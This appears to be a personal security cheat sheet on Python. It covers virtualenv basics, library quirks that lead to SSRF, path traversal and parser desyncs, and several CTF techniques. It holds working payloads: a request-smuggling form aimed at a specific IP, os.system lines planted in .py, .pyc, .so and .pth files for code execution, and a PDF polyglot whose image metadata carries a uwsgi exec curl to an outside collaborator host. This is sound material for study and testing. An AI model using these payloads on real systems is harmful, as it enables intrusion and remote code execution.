# Building and command line

### venv

- Create the v environment
    - If --system-site-packages is specified , a link to external packages is created aswell as the standard library

```bash
$ python3 -m venv venv-name/   --system-site-packages
```

- Select python version:
```bash
$ virtualenv -p python3.14 venv

$ virtualenv -p 3.10 venv

$ virtualenv -p pypy3 venv

$ virtualenv -p rustpython venv

#Specify the full path to a Python interpreter:
$ virtualenv -p /usr/bin/python3.9 venv
```

- Activate the venv (being in the folder venv-name/ is created)

```bash
$ source venv/bin/activate
(venv) $
```


- Install packages in it 

`(venv) $ python -m pip install <package-name>`

- Deactivate it

```bash
(venv) $ deactivate
$
```

### virtualenv

```bash
$ virtualenv venv/


$ source venv/bin/activate
(venv) $
```

- Change the python version

` $ virtualenv venv/ -p {Path_to_binary}`


- Deactivate

` $ deactivate`




# Python Tricks

## ipaddress.IPv4Address()

- IPv4Address performs ip normaliation which could lead to ssrf vulnerabilities if invoked after blacklist checks

```python
def send_request(request):
    ip = request.GET["ip"]
    try:
        if ip in ["127.0.0.1", "0.0.0.0"]:
            return HttpResponse("Not allowed")
        ip = str(ipaddress.IPv4Address(ip))
    except ipaddress.AddressValueError:
        return HttpResponse("Error at validation!")
    requests.get("https://" + ip)
    return HttpResponse("Request send!")

ip = '127.00.0.1'
ip = '127.1'
```

## re.match vs re.search

- re.match only sanitizes the first line
- everything after a `\n` passes the re.match sanitization

```python
>>> comp = re.compile(".*(abc)|(cba).*")
>>> re.search(comp,'aaa\nabc')
<re.Match object; span=(4, 7), match='abc'>
>>> re.match(comp,'aaa\nabc')
```

## tempfile.NamedTemporaryFile

- used to create temporary files with a specific name
- prefix and suffix parameters are vulnerable to a path traversal attack

```python
def touch_tmp_file(request):
    id = request.GET["id"]
    tmp_file = tempfile.NamedTemporaryFile(prefix=id)
    return HttpResponse(f"tmp file: {tmp_file} created!", content_type="text/plain")
id = '/../var/www/test'
```
## urllib vs requests/urllib3

- You can try adding an extra `\` when injecting in a string to escape the already existand one.

```python
>>> urllib.parse.urlparse('http://google.com\@python.com').hostname
'python.com'

>>>requests.get('http://google.com\@python.com') # fetches google.com
```


## os.path.join(path, / , *paths)

- Returns a concatenation of path with paths.

- If one of the *paths variable of os.path.join(path,/,*paths) is absolute path , the return value has this as a basedir and the previous paths are ignored, including the first variable path.


```python
>>>os.path.join('/home/','/etc/passwd/')
/etc/passwd
```

```python
>>> os.path.join('http://127.0.0.1:8000','http://attacker.com')
http://attacker.com
```

## pathlib.Path
- Purepath.joinpath has a similar functionality

```python
from pathlib import Path
payload = "/etc/passwd"

file = Path("/var/www/html").joinpath("files", payload)

with open(file, "r") as f:
   print(f.read()) # print the “/etc/passwd” file content
```

## urllib.parse.urljoin

- Similarly the urljoin can be used to concatenate a base url component with a relative one

- If the second parameter is an absolute url though, the output result is this parameter as is.Some absolute url are:
    - //url
    - scheme://url

```python
>>> from urllib.parse import urljoin

>>> urljoin('http://www.cwi.nl/%7Eguido/Python.html', 'FAQ.html')
'http://www.cwi.nl/%7Eguido/FAQ.html'

>>>urljoin('http://www.example.com/b',
            '//www.attacker.com/a')
"http://www.attacker.com/a"
```

## urllib.parse.urlsplit vs urllib.request.urlretrieve

- urlretrive supports an odd URL format : `<URL:scheme://host:port?/path?>`
- Attackers can bypass scheme blacklisting when these two methods used inline

```python
>>> urllib.parse.urlsplit("<URL:http://www.google.com>")
SplitResult(scheme='', netloc='', path='<URL:http://www.google.com>', query='', fragment='')
```

```python
>>> a,b = urllib.request.urlretrieve("<URL:http://google.com>")
>>> b
<http.client.HTTPMessage object at 0x7f9426cc7d90>
```

## String encoding

[pydocs](https://docs.python.org/3/howto/unicode.html)

- One possible option to bypass wafs and restrictions or filters in strings is by using benign string encoding

- If your input is passed in a string literal , python might intepret some characters encoded in other than the usual utf-8 , in a way that it downgrades to utf-8(default encoding in python) eventually

-  Examples :

```python
>>>"\N{GREEK CAPITAL LETTER DELTA}"  # Using the character name
'\u0394'

>>>"\u0394"                          # Using a 16-bit hex value
'\u0394'

>>>"\U00000394"                      # Using a 32-bit hex value
'\u0394'
```

#### Abusing IDNA Standard



```python
>> "ß".toLowerCase()
"ß"
>> "ß".toUpperCase()
"SS"
>> ["ss", "SS"].indexOf("ß")
false
>> location.href = "http://wordpreß.com"
```


# Python gotchas


### Cathing Errors

- Trying to catch multiple exceptions in the same exception with a boolean expression of exceptions may not work as intended

- A boolean expression of exceptions results in a single exception class;

- using a boolean expression in an except block will result in catching only one kind of exception 

```python
error = ValueError or TypeError

error is ValueError # True

error is TypeError # False

error = ValueError and TypeError

error is ValueError # False

error is TypeError # True
```


### Decorator`s order 


- In Python, decorators apply bottom-to-top

- So in the above flask example, the login check never applies to incoming requests , as @login_required wraps that function after the app.route(), but Flask already stored a reference to the unwrapped version.

```python
@login_required 

@app.get('/api/document') 

def handle_document():
    ...
    f = open('report.pdf', 'rb')
    return send_file(f)
```





# Python Desync Attacks

- Similar to Request smuggling attacks
- If a python web server responds with a 4XX,5XX in a POST Requests before handling body
- But it doesnt terminates the connection, and responding with `Connection: close`
- The body of the first Request [might end up](https://mizu.re/post/twisty-python) desyncing the server and smuggle a new request.

[Sudistark writeups](https://github.com/Sudistark/CTF-Writeups/blob/main/Flatt-Security-XSS-Challenge/solutions.md#challenge-2-by-ryotkak)

```python
class RequestHandler(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'
    content_type_text = 'text/plain; charset=utf-8'
    content_type_html = 'text/html; charset=utf-8'

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length'))
        if content_length > 100:
            self.send_response(413)
            self.send_data(self.content_type_text, b'Post is too large')
            return
        body = self.rfile.read(content_length)
        draft_id = str(uuid4())
        drafts[draft_id] = body.decode('utf-8')
        self.send_response(200)
        self.send_data(self.content_type_text, bytes(draft_id, 'utf-8'))

    def send_data(self, content_type, body):
        self.send_header('Content-Type', content_type)
        self.send_header('Connection', 'keep-alive')
        self.send_header('Content-Length', len(body))
        self.end_headers()
        self.wfile.write(body)
```

```html
<form action="http://34.171.202.118/" method="POST" enctype="text/plain" target="shirley">
    <textarea name="http"></textarea>
</form>

<script>
    document.forms[0].http.name = `GET /shirley HTTP/1.1\r\na:a\r\nX:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`;
    setTimeout('document.forms[0].submit()',3000)
</script>
```

# json vs ujson desyncs

- ujson library [versions < 5.4.0](https://github.com/ultrajson/ultrajson/security/advisories/GHSA-wpqr-jcpx-745r) will truncate ilegall utf-8 high surrogates ,while json standard library will not
- json data passed from these two different parsers in pipelined application logic are [possible desync](https://bishopfox.com/blog/json-interoperability-vulnerabilities) targets.


```python
>>> json.loads('{"role":"user","role\\ud800":"admin"}')
{'role': 'user', 'role\ud800': 'admin'}
>>> ujson.loads('{"role":"user","role\\ud800":"admin"}')
{'role': 'admin'}
```


# .pyc files 


- [CPython](https://peps.python.org/pep-3147/#case-0-the-steady-state) compiles its source code into “byte code”, and for performance reasons, it caches this byte code on the file system whenever the source file has changes.
- This makes loading of Python modules much faster because the compilation phase can be bypassed.
- When your source file is foo.py, CPython caches the byte code in a foo.pyc file right next to the source.
- When a Python source file is imported for the first time, a __pycache__ directory will be created in the package directory, if one does not already exist.
- Cached files are located in `__pycache__/foo.<magic>.pyc`
    - It will be created at the first import of foo.py, after Python byte compiles it.
    - Every other further import statement will load this pyc file instead of the .py file.
    - But the .py needs to be always available in the filesystem , otherwise the .pyc will not load.


### File structure

- 4byte magic string
    - Python version specific
- 4byte [bitfield](https://peps.python.org/pep-0552/)
- 4byte timestamp
    - The timestamp is used to make sure that the pyc file match the py file that was used to create it.
    - When either the magic number or timestamp do not match, the py file is recompiled and a new pyc file is written.
- 4byte filesize
- arbitary byte code from [marshalled](https://docs.python.org/3/library/marshal.html) python code.


# Arbitary File Write In Python Webservers


### overwriting .py file

```python
__import__("os").system("id > /tmp/pwned")
```


### overwriting .pyc file

- An attacker can [overide](https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/) a .pyc chace file inside `__pycache__`
- Keep in mind that he first has to read that file, exfiltrate the header([or build it from sourcecode](https://qiita.com/tournip/items/90da8ff66d2113c08ce8#intended-approach)) and append it to  the new one in order for the python importer not to regenerate it.


```python
RCE_SOURCE_CODE = f'__import__("os").system("id > /app/uploads/{EXFILTRATED_FLAG_FILENAME}")'
def modifyBytecode(bytecode):
    headers = bytecode[0:16]
    codeObject = compile(RCE_SOURCE_CODE, BYTECODE_FILENAME, 'exec')
    codeBytes = marshal.dumps(codeObject)

    newBytecode = magicNumber + bitField + modDate + sourceSize + codeBytes
    return newBytecode
```

- If arbitary file read is not possible, an attacker must leak the information through the app

- Py version is usually present in response headers
- Change to that version with pyenv and execute:

```python
>>> import importlib.util
>>> importlib.util.MAGIC_NUMBER
b'\xa7\r\r\n'
```


### overwriting .so files

- A file with .so extension is a library containing binary code to perform .so functions. The .so file allows more than one program to use the functions it stores at the same time.
- They are cython-compiled versions of the .py files.

- While looking for a module or package named “foo”, for each directory in the parent path:
    - If `/foo/init.py` is found, a regular package is imported and returned.
    - If not, but /foo.{py,pyc,so,pyd} is found, a module is imported and returned.
    - Also foo.so will take precedence over foo.py
- So an attacker can create a `<libname>.so` file, place it in same directory of the app as the original, and trigger the import

- The file needs to be compiled in the same enviroment as the platform running the app.

```python
# setup.py
from setuptools import setup
from Cython.Build import cythonize

with open('utils.pyx', 'w') as f:
    f.write('''import os

MAGIC = '%PDF-'
def saveFile(filePath, fileContent):
        os.system('/readflag > uploads/answer.txt')
        with open(filePath, 'wb') as file:
            file.write(fileContent)
''')

setup(
    name="utils",
    ext_modules=cythonize("utils.pyx"),
)
```

```bash
$python3 setup.py build_ext --inplace
```

- Or use [cythonize](https://cython.readthedocs.io/en/latest/src/userguide/source_files_and_compilation.html)

```bash
cythonize -i setup.py
```


### writing to .pth files

-  [site-specific configuration hooks](https://docs.python.org/3/library/site.html) is a feature in python ,that is automatically included
- It allows to add custom module search paths to a specific site/module.
- That means that if you create a `.local/lib/pythonX.Y/site-packages/*.pth` file in your home directory, any path in there is going to be added to sys.path.
- This path is relative to the [PYTHONUSERBASE](https://docs.python.org/3/using/cmdline.html#envvar-PYTHONUSERBASE)
env variable, so changing that you can place the .pth file accordingly.


```bash
$echo '/tmp' > ~/.local/lib/python3.10/site-packages/foo.pth
$python3
>>> import sys
>>> sys.path
[ ... '/tmp', ... ]
```

- In addition, a line starting with import in this file, [is inserted in an exec statement](https://www.sonarsource.com/blog/pretalx-vulnerabilities-how-to-get-accepted-at-every-conference/), so an attacker can have a possible RCE vector once a new Python process is spawned.

```bash
$echo 'import os;os.system("whoami>/tmp/x")' > .local/lib/python3.10/site-packages/arbitrary_name.pth
```



# Utilities


## Polyglots

### Creating a pdf with retained text data

- An attacker can create valid pdf formats to be [uploaded](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html) and also embed plaintext that will be retained and not get pdf-formated.
- This means that if the pdf file is to treated as cleartext file, the plaitext embeded will be retrived as is.
- In this example the data are embeded in metadata of a jpg file inside the pdf.

```python
    from fpdf import FPDF
    from exiftool import ExifToolHelper

    with ExifToolHelper() as et:
        et.set_tags(
            ["doyensec.jpg"],
            tags={"model": "&#x0a;[uwsgi]&#x0a;foo = @(exec://curl http://collaborator-unique-host.oastify.com)&#x0a;"},
            params=["-E", "-overwrite_original"]
        )

    class MyFPDF(FPDF):
        pass

    pdf = MyFPDF()

    pdf.add_page()
    pdf.image('./doyensec.jpg')
    pdf.output('payload.pdf', 'F')
```



# flask.send_file() Race Condition


- Flask is a wrapper around werkzeug , so the actual send_file() code resides in werkzeugs code base.
- There is a race condition that came up in a recent [ctf challenge in l3akctf26](https://github.com/L3AK-TEAM/L3akCTF2026-public/blob/main/web/squid/build/app/public_app.py#L274) , that requires to take  advantage of it to read a dynamically generated file from /proc filesystem.
- The problem was that the `os.stat(file)` in dynamically generated files return zero size , resulting in the server sending back content-length: 0 and zero bytes in the body.

- [Werkzeug code](https://github.com/pallets/werkzeug/blob/main/src/werkzeug/utils.py#L438):

```python

def send_file(
    path_or_file: os.PathLike[str] | str | t.IO[bytes],
    ...
) -> Response:

    # snip.......

    if isinstance(path_or_file, (os.PathLike, str)) or hasattr(
        path_or_file, "__fspath__"
    ):
        path_or_file = t.cast("os.PathLike[str] | str", path_or_file)

        # Flask will pass app.root_path, allowing its send_file wrapper
        # to not have to deal with paths.
        if _root_path is not None:
            path = os.path.join(_root_path, path_or_file)
        else:
            path = os.path.abspath(path_or_file)
        # We land here and instantiate size variable which is 0 for /proc/... files
        stat = os.stat(path)
        size = stat.st_size
        mtime = stat.st_mtime
    else:
        file = path_or_file

    # some 20 and more lines of code in between ... 


    if use_x_sendfile and path is not None:
        headers["X-Sendfile"] = path
        data = None
    else:
        if file is None:
            file = open(path, "rb")  # file is opened based on path, no matter the sie variable
        elif isinstance(file, io.BytesIO):
            size = file.getbuffer().nbytes
        elif isinstance(file, io.TextIOBase):
            raise ValueError("Files must be opened in binary mode or use BytesIO.")

        data = wrap_file(environ, file)

    rv = response_class(
        data, mimetype=mimetype, headers=headers, direct_passthrough=True
    )

    if size is not None:
        rv.content_length = size

    # Lots of lines also here snipped, non of them actually braking till it returns rv: Response type

    return rv

```

- The gadget [here](https://jorianwoltjer.com/blog/p/ctf/l3akctf-2026-squid#flask-send_file-size-race-condition) is using `/proc/self/fd/<n>` files
- These are file descriptor symlinks to the opened files by the application
    - When an application opens a file descriptor, a symlink to that file is created and stored in this directory, which points to the actual file.
    - The caveat is that when the file is closed the fd is reused , so the same symlink file will point to another newlly opened file descriptor.
-  If we had pointed a send_file() at `/proc/self/fd/3` with the correct timing, it could read the size of `/etc/passwd` with the content of `/proc/{pid}/environ`!
    - This basically means fuzz the app with requests pointing to the 'size' file we choose and the actual file we want to read (with file size 0), and in between throw file reads to the file descriptor(`/proc/self/fd/<num>`) to actually retrieve the contents.

